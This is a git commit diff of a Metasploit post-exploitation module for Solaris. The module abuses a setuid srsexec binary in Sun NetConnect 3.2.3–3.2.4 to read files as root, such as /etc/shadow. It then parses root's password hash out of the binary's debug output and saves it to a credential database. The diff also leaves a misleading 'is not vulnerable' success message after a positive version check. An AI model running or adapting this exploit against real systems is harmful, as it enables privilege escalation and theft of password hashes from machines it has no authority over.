2f53e370c948dea425e7a9e324e16bc9ce3af179
h00die <michaeltcyr@gmail.com>
2018-09-13 16:37:25 -0400

    srsexec working properly

--- modules/post/solaris/escalate/srsexec_readline.rb
+++ modules/post/solaris/escalate/srsexec_readline.rb
@@ -39,34 +39,32 @@ class MetasploitModule < Msf::Post
   end
 
   def check
+    if is_root?
+      fail_with Failure::BadConfig, 'Session already has root privileges'
+    end
+
     # This ls is based on the guidance in the sun alerts article
     unin = cmd_exec '/usr/bin/ls /opt/SUNWsrspx/bin/UninstallNetConnect.*.sh'
-    # XXX the following three lines are for error checking and should be removed
-    print_status(unin)
-    print_status(cmd_exec 'ls /')
-    print_status(cmd_exec 'whoami')
-    version = unin.match(/UninstallNetConnect\.([\d\.]{11})\.sh/)
-    unless version
+    unin =~ /UninstallNetConnect\.([\d\.]{11})\.sh/
+    vprint_status("Version Detected: #{$1}")
+    unless $1
       print_error 'NetConnect uninstall not found, either not installed or too new'
       return false
     end
 
-    unless setuid? suid_bin_path
+    version = Gem::Version.new($1.split(".").map(&:to_i).join('.'))
+    unless version.between?(Gem::Version.new('3.2.3'), Gem::Version.new('3.2.4'))
+      print_error "#{version} is not vulnerable"
+      return false
+    end
+    print_good "#{version} is not vulnerable"
+
+    unless get_suid_files suid_bin_path
       vprint_error "#{suid_bin_path} is not setuid, it must have been manually patched"
       return false
     end
 
-    version = Gem::Version.new(version.split(".").map(&:to_i).join('.'))
-    if version.between?(Gem::Version.new('3.2.3'), Gem::Version.new('3.2.4'))
-      print_good "#{version} is vulnerable"
-      return true
-    end
-    print_error "#{version} is not vulnerable"
-    false
-
-    if is_root?
-      fail_with Failure::BadConfig, 'Session already has root privileges'
-    end
+    true
   end
 
   def run
@@ -74,31 +72,34 @@ class MetasploitModule < Msf::Post
       fail_with Failure::NotVulnerable, 'Target is not vulnerable'
     end
 
-    flag = 'foobar'
+    flag = (0...5).map { ('a'..'z').to_a[rand(26)] }.join
     output = cmd_exec("#{suid_bin_path} -dvb #{datastore['FILE']} #{flag}")
-    vprint_good(output)
-    if datastore['FILE'] == '/etc/shadow'
-      formatted_output = ''
-      output.scan(/binaries file line: (.)$/){ |line|
-        if line.length == 20
-          formatted_output = line[0..18]
-        else
-          formatted_output = line
-        end
-      }
-      unless formatted_output.empty?
-        credential_data = {
-          origin_type: :session,
-          session_id: session_db_id,
-          workspace_id: myworkspace.id,
-          module_fullname: self.fullname,
-          username: formatted_output.split(':')[0],
-          private_data: formatted_output.split(':')[1],
-          private_type: :nonreplayable_hash
-        }
-        create_credential(credential_data)
-      end
-    end
+    vprint_good("Output: #{output}")
+    return unless datastore['FILE'] == '/etc/shadow'
 
+    #process the data to pull the hash
+    formatted_output = ''
+    output.scan(/binaries file line: (.+)$/){ |line|
+      line = line[0].to_s
+      if line.length == 20
+        formatted_output << line[0..18]
+      else
+        formatted_output << line
+      end
+    }
+
+    unless formatted_output.empty?
+      print_good('Adding root\'s hash added to credential database.')
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        workspace_id: myworkspace.id,
+        post_reference_name: self.fullname,
+        username: formatted_output.split(':')[0],
+        private_data: formatted_output.split(':')[1],
+        private_type: :nonreplayable_hash
+      }
+      create_credential(credential_data)
+    end
   end
 end
